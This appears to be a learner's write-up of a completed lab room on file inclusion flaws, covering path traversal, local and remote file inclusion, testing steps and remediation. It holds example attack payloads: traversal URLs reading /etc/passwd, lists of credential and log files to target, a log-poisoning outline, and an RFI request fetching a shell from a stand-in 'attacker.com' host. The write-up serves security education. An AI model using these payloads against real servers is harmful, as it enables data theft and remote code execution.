## Overview

File Inclusion vulnerabilities occur when a web application dynamically includes files based on **user-controlled input** without proper validation. These vulnerabilities allow attackers to access sensitive files on the server or include malicious remote files.

File inclusion issues typically arise in applications that use parameters to load files.

Example vulnerable URL:


http://example.com/index.php?page=home


If user input is not validated, attackers can manipulate the `page` parameter to include unintended files.

This room covered three major vulnerability types:

- Path Traversal
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)

These vulnerabilities can lead to **sensitive data exposure, server compromise, and remote code execution** if exploited successfully.

---

## Understanding URL Parameters

Many web applications retrieve files using parameters.

Example:


http://example.com/index.php?page=about.php


URL structure components:


Protocol → http / https
Domain → example.com
Path → /index.php
Parameter → ?page=about.php


If the application directly loads files based on the `page` parameter without validation, attackers may manipulate the value.

---

## Path Traversal

Path traversal (also called **directory traversal**) allows attackers to move outside the intended directory structure and access sensitive files.

Attackers use traversal sequences such as:


../


Example attack:


http://example.com/index.php?page=../../../../etc/passwd


If successful, the attacker may access system files.

Common sensitive targets:
/etc/passwd
/etc/shadow
/var/log/auth.log


Windows targets:


C:\Windows\System32\drivers\etc\hosts


Attackers may also attempt **encoded traversal payloads** to bypass filters.

These represent encoded forms of `../`.

Impact:

- Reading system configuration files
- Discovering user accounts
- Accessing application secrets

---

## Local File Inclusion (LFI)

LFI occurs when a web application allows attackers to include files **from the local server**.

Example vulnerable code behavior:


index.php?page=home.php


Attack:


index.php?page=../../../../etc/passwd


The application loads system files from the local machine.

Common LFI targets:


/etc/passwd
/var/log/apache2/access.log
/var/log/auth.log


Attackers often attempt **log file inclusion** to escalate the attack.

Example process:

1. Inject malicious code into logs.
2. Include the log file via LFI.
3. Execute injected code.

Possible outcomes:

- Sensitive data disclosure
- Source code exposure
- Remote command execution

---

## Remote File Inclusion (RFI)

RFI occurs when a web application allows inclusion of **files from external servers**.

Example vulnerable request:


http://example.com/index.php?page=http://attacker.com/shell.txt


If the server allows remote file inclusion, it may execute malicious code hosted on the attacker's server.

Impact:

- Remote code execution
- Server takeover
- Malware deployment
- Backdoor installation

RFI is less common today because modern PHP configurations disable remote file inclusion by default.

---

## Practical Testing Methodology

When testing for file inclusion vulnerabilities:

1. Identify parameters that load files.
2. Intercept requests using a proxy (e.g., Burp Suite).
3. Modify parameters with traversal payloads.
4. Observe server responses.
5. Attempt sensitive file access.
Indicators of vulnerability:

- System file content displayed
- Error messages revealing file paths
- Application source code exposed

---

## Security Risks and Impact

File inclusion vulnerabilities can lead to:

- Exposure of sensitive files
- Source code disclosure
- Credential leaks
- Server compromise
- Remote code execution
- Privilege escalation

In severe cases, attackers can gain **full control of the server**.

---

## Remediation and Prevention

Secure development practices are critical to prevent file inclusion vulnerabilities.

Recommended defenses:

- Validate and sanitize all user input
- Use allowlists for acceptable file names
- Avoid direct user-controlled file references
- Disable remote file inclusion in server configuration
- Restrict file access permissions
- Implement proper input filtering
- Use secure coding frameworks

Additional security measures:

- Web Application Firewall (WAF)
- Secure server configurations
- Regular security testing
- Static and dynamic code analysis

---

## Key Security Takeaways

File inclusion vulnerabilities occur when applications improperly trust user input used to retrieve files. Attackers exploit this weakness to access sensitive system files or execute malicious code. Understanding path traversal, LFI, and RFI techniques is essential for identifying these vulnerabilities during security testing. Proper input validation, strict access control, and secure coding practices are critical to preventing file inclusion attacks.

---

Room Completed: **File Inclusion**  
Focus Area: **Web Application Security | LFI | RFI | Path Traversal**